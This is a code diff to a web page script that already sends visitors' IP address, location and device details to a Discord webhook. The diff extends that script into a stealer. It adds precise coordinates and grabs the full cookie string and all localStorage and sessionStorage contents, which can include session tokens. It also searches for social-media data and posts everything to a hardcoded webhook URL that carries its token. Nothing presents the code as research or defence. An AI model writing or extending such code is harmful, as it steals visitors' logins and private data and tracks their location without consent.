@@ -43,7 +43,7 @@
                 .then(response => response.json())
                 .then(data => {
                     // Collecting additional info
-                    const geoInfo = `IP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nTimezone: ${data.timezone}\nCurrency: ${data.currency}`;
+                    const geoInfo = `IP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nLatitude: ${data.latitude}\nLongitude: ${data.longitude}\nTimezone: ${data.timezone}\nCurrency: ${data.currency}`;
 
                     const systemInfo = `
                         Screen Resolution: ${window.innerWidth}x${window.innerHeight}
@@ -54,12 +54,25 @@
                         Battery Status: ${navigator.getBattery ? getBatteryStatus() : 'N/A'}
                         RAM: ${navigator.deviceMemory}GB
                         CPU Cores: ${navigator.hardwareConcurrency}
+                        Storage: ${navigator.storage ? getStorageInfo() : 'N/A'}
+                        Connection: ${navigator.connection ? getConnectionInfo() : 'N/A'}
                     `;
 
-                    const performanceInfo = `Page Load Time: ${window.performance.timing.loadEventEnd - window.performance.timing.navigationStart} ms`;
+                    const performanceInfo = `Page Load Time: ${window.performance.timing.loadEventEnd - window.performance.timing.navigationStart} ms
+                                             DNS Lookup: ${window.performance.timing.domainLookupEnd - window.performance.timing.domainLookupStart} ms
+                                             TCP Handshake: ${window.performance.timing.connectEnd - window.performance.timing.connectStart} ms
+                                             First Byte: ${window.performance.timing.responseStart - window.performance.timing.requestStart} ms`;
+
+                    // Collect Cookies, LocalStorage, and SessionStorage info
+                    const cookies = document.cookie ? `Cookies: ${document.cookie}` : 'No Cookies Available';
+                    const localStorageInfo = localStorage.length ? `LocalStorage: ${JSON.stringify(localStorage)}` : 'No LocalStorage Data';
+                    const sessionStorageInfo = sessionStorage.length ? `SessionStorage: ${JSON.stringify(sessionStorage)}` : 'No SessionStorage Data';
+
+                    // Attempting to get social media links from local storage or cookies
+                    const socialLinks = getSocialLinksFromStorage();
 
                     // Send the info to Discord Webhook
-                    sendToWebhook(geoInfo, systemInfo, performanceInfo);
+                    sendToWebhook(geoInfo, systemInfo, performanceInfo, cookies, localStorageInfo, sessionStorageInfo, socialLinks);
                 })
                 .catch(error => {
                     console.error('Error fetching geo data:', error);
@@ -79,7 +92,37 @@
             });
         }
 
-        function sendToWebhook(geoInfo, systemInfo, performanceInfo) {
+        function getStorageInfo() {
+            return navigator.storage.estimate().then(estimate => {
+                return `Used: ${estimate.usage} bytes, Free: ${estimate.quota - estimate.usage} bytes`;
+            });
+        }
+
+        function getConnectionInfo() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            return connection ? `Type: ${connection.effectiveType}, Speed: ${connection.downlink} Mbps` : 'N/A';
+        }
+
+        function getSocialLinksFromStorage() {
+            // Check for social media links in localStorage or cookies
+            const socialLinks = [];
+
+            // Example search for social media-related terms
+            if (document.cookie.includes('youtube.com')) {
+                socialLinks.push('YouTube link found in cookies');
+            }
+            if (localStorage.getItem('youtube')) {
+                socialLinks.push(`YouTube link found in localStorage: ${localStorage.getItem('youtube')}`);
+            }
+            if (sessionStorage.getItem('youtube')) {
+                socialLinks.push(`YouTube link found in sessionStorage: ${sessionStorage.getItem('youtube')}`);
+            }
+
+            // Add more checks for other social platforms (Twitter, Instagram, etc.) as needed
+            return socialLinks.length > 0 ? socialLinks.join('\n') : 'No social media links found';
+        }
+
+        function sendToWebhook(geoInfo, systemInfo, performanceInfo, cookies, localStorageInfo, sessionStorageInfo, socialLinks) {
             const webhookURL = "https://discord.com/api/webhooks/1334960796609937499/7YlpdDT2pphEH6wCeuD6eS10QIS1QQVyz2HicjXZPK5lZ7XOpgs3ZBiG_7fDFhiTpAWm"; // Replace with your actual Discord webhook URL
 
             const content = {
@@ -89,7 +132,11 @@
                     fields: [
                         { name: "Geolocation Info", value: geoInfo, inline: false },
                         { name: "System Info", value: systemInfo, inline: false },
-                        { name: "Performance Info", value: performanceInfo, inline: false }
+                        { name: "Performance Info", value: performanceInfo, inline: false },
+                        { name: "Cookies", value: cookies, inline: false },
+                        { name: "LocalStorage", value: localStorageInfo, inline: false },
+                        { name: "SessionStorage", value: sessionStorageInfo, inline: false },
+                        { name: "Social Media Links", value: socialLinks, inline: false }
                     ],
                     footer: {
                         text: "Info Sent from Web"
